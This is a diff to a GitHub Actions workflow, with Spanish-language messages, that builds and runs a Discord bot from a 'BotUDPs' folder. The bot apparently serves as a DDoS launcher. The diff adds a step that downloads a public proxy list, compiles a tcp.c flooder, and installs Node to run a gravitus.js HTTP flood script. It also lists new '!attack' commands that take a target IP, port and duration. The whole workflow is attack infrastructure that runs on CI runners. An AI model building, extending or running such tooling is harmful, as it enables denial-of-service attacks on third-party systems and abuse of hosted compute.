@@ -1,4 +1,4 @@
-name: IRUEDOOLO
+name: bot bot bot
 
 on:
   workflow_dispatch:
@@ -37,7 +37,7 @@ jobs:
       run: |
         echo "Instalando herramientas..."
         sudo apt-get update
-        sudo apt-get install -y build-essential gcc g++ make libpcap-dev
+        sudo apt-get install -y build-essential gcc g++ make libpcap-dev wget
         echo "✅ Herramientas instaladas"
     
     - name: 📦 Instalar discord.py
@@ -45,7 +45,14 @@ jobs:
         cd BotUDPs
         pip install discord.py
         echo "✅ discord.py instalado"
-    
+
+    - name: Download and prepare proxy list
+      run: |
+        cd BotUDPs
+        echo "=== Downloading Proxy List ==="
+        wget -O proxy.txt "https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=100&country=all&ssl=all&anonymity=all&skip=0&limit=2000"
+        echo "=== Proxy List Downloaded ==="
+
     - name: 🛠️ COMPILAR CON CONTINUACIÓN ANTE ERRORES
       run: |
         cd BotUDPs
@@ -81,6 +88,12 @@ jobs:
             ((failed++))
           fi
         done
+
+        echo ""
+        echo "🔨 Compilando tcp sin threads: tcp.c → tcp"
+        gcc -O3 tcp.c -o tcp
+        chmod +x tcp
+        echo ""
         
         echo ""
         echo "========================================"
@@ -99,6 +112,7 @@ jobs:
         
         echo "========================================"
         echo "⚠️  Continuando aunque algunos archivos hayan fallado"
+
     
     - name: 🦾 Configurar Go para scripts .go
       run: |
@@ -130,7 +144,14 @@ jobs:
         
         echo "$DISCORD_TOKEN" > token.txt
         echo "✅ Token guardado en token.txt"
-    
+
+    - name: Install Node.js
+      run: |
+          cd BotUDPs
+          sudo apt-get update
+          sudo apt-get install -y nodejs npm
+          sudo npm install -g request
+
     - name: 🚀 EJECUTAR bot.py
       run: |
         cd BotUDPs
@@ -150,16 +171,28 @@ jobs:
           echo "❌ ERROR: token.txt no encontrado"
           exit 1
         fi
+
+        if [ ! -f "gravitus.js" ]; then
+          echo "❌ ERROR: gravitus.js no encontrado"
+          exit 1
+        fi
+
+        if [ ! -f "proxy.txt" ]; then
+          echo "❌ ERROR: proxy.txt no encontrado"
+          exit 1
+        fi
         
         echo "✅ Archivos críticos verificados"
         echo "🎮 Métodos disponibles según ejecutables:"
         
         # Mostrar métodos basados en ejecutables disponibles
-        for method in udp udphex udppps ovh udppayload; do
+        for method in udp udphex udppps ovh tcp udppayload udpbypass; do
           if [ -f "$method" ]; then
             echo "  !attack $method [IP] [PUERTO] [TIEMPO]"
           fi
         done
+
+        echo "  !attack httpsrequest [IP] [PUERTO] [TIEMPO]"
         
         if [ -f "udpflood.go" ]; then
           echo "  !attack udpflood [IP] [PUERTO] [TIEMPO]"
